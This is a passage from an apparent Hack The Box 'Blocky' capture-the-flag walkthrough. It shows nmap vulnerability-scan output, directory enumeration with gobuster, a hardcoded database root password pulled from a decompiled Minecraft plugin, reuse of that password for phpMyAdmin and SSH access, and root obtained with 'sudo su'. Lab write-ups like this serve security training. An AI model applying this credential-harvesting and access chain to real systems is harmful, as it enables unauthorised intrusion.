|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302 
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301 
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763 
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975 
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546 
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D
*EXPLOIT* 
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/      3.5     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2018-1283/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283 
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612 
|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT* 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
| http-wordpress-users:  
| Username found: notch 
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit' 
| http-enum:  
|   /wiki/: Wiki 
|   /wp-login.php: Possible admin folder 
|   /phpmyadmin/: phpMyAdmin 
|   /readme.html: Wordpress version: 2  
|   /: WordPress version: 4.8 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found. 
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found. 
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found. 
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found. 
|   /wp-login.php: Wordpress login page. 
|   /wp-admin/upgrade.php: Wordpress login page. 
|_  /readme.html: Interesting, a readme. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
|_      http://ha.ckers.org/slowloris/ 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
8192/tcp closed sophos 
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (93%), Linux 3.16 (93%), Linux 4.2 (93%), 
Linux 4.4 (93%), Linux 3.16 - 4.6 (91%), Linux 3.2 - 4.9 (91%), Linux 4.8 (91%), Linux 4.9 (90%) 
No exact OS matches for host (test conditions non-ideal). 
Uptime guess: 0.004 days (since Sat Apr  9 18:10:24 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=257 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 8192/tcp) 
HOP RTT       ADDRESS 
1   291.32 ms 10.10.14.1 
2   289.46 ms 10.10.10.37
```

## now let's acess http port . we got a web page given below

![minecraft](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Blocky/minecraft.png)

## let's start gobuster for enumerating hidden directory.

```console
gobuster dir -u http://10.10.10.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
```

### Result

```
/wiki                 (Status: 301) [Size: 309] [--> http://10.10.10.37/wiki/] 
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.37/wp-content/] 
/plugins              (Status: 301) [Size: 312] [--> http://10.10.10.37/plugins/]    
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.37/wp-includes/] 
/javascript           (Status: 301) [Size: 315] [--> http://10.10.10.37/javascript/]  
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.10.37/wp-admin/]    
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.10.37/phpmyadmin/]  
/server-status        (Status: 403) [Size: 299]    
```

## got some directories first let's access /plugins directory inside of plugins directory i got two file image given below

![plugins](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Blocky/plugins.png)

## i download them and decompiler them with a online website (http://www.javadecompilers.com/)

## after decompile we got a zip file to download let unzip it using below command.

```console
unzip BlockyCore_source_from_Procyon.zip
```

## after unzip we got a folder inside the end of this  folder we got a file name as BlockyCore.java.

## let's read it.

```
//  
// Decompiled by Procyon v0.5.36 
//  
 
package com.myfirstplugin; 
 
public class BlockyCore 
{ 
    public String sqlHost; 
    public String sqlUser; 
    public String sqlPass; 
     
    public BlockyCore() { 
        this.sqlHost = "localhost"; 
        this.sqlUser = "root"; 
        this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22"; 
    } 
     
    public void onServerStart() { 
    } 
     
    public void onServerStop() { 
    } 
     
    public void onPlayerJoin() { 
        this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!"); 
    } 
     
    public void sendMessage(final String username, final String message) { 
    } 
}
```

## here we got user as root and password 8YsqfCTnvxAUeduzjNSXe22 then i use this credentials in http://10.10.10.37/phpmyadmin/ and got access.

![webroot](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Blocky/webroot.png)

## on the left side we got some options after accessing wordpress → wp_users got a username and password hash.

![notch](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Blocky/notch.png)

## we know ssh port is open let's access it as user as notch and password found in BlockyCore.java file as 8YsqfCTnvxAUeduzjNSXe22

## we successfully login 

```console
$ ssh notch@10.10.10.37 
The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established. 
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900. 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts. 
notch@10.10.10.37's password:  
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) 
 
 * Documentation:  https://help.ubuntu.com 
 * Management:     https://landscape.canonical.com 
 * Support:        https://ubuntu.com/advantage 
 
7 packages can be updated. 
7 updates are security updates. 
 
 
Last login: Sun Dec 24 09:34:35 2017 
notch@Blocky:~$ ls 
minecraft  user.txt 
notch@Blocky:~$ 
```

## then i do sudo -l and give notch password 

### Result

```
Matching Defaults entries for notch on Blocky: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
 
User notch may run the following commands on Blocky: 
    (ALL : ALL) ALL
```

## now it is simple to priv esc use below command 

```
sudo su
```

# BOOOMMM!! WE GOT ROOT

![funny](https://c.tenor.com/JSF_e0xxE5AAAAAC/star-warch-fist-punch.gif)
